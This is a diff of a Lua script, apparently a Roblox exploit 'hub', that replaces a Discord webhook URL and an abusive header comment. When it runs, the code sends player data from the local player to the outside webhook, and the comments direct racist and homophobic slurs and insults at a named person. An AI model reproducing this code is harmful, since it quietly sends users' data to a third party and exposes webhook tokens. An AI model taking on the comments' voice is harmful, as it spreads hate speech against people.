@@ -10,7 +10,7 @@
 
 -- Open Source
 -- Who Will Delete Or Spam Webhook - Gay + Nigger
--- k5utils if u see this u fuckin retarded kid
+-- k5utils dumb nigger. can you imagine how much i don't care? solara hub is just a collection of scripts that i didn't even create. i don't give a shit that you decompiled solara hub
 
 
 
@@ -192,5 +192,5 @@ end
 
 local player = Players.LocalPlayer
 if player then
-    SendWebhook("https://discord.com/api/webhooks/1440676802254344243/QwaLYih08SHzNsSqUnMox9g3sIPum0pVTn3E-uYUIGyxhh7NNYwNTXBkx2xZRFU0nsFB", CreateWebhook(player))
+    SendWebhook("https://discord.com/api/webhooks/1440683929773539429/ThYaTE_YNv7jud9YY2ZTfrG34Z5DAsGkPS4M9o_VvlGDQTaiqiYEuIKQAsszFu6bgSW9", CreateWebhook(player))
 end
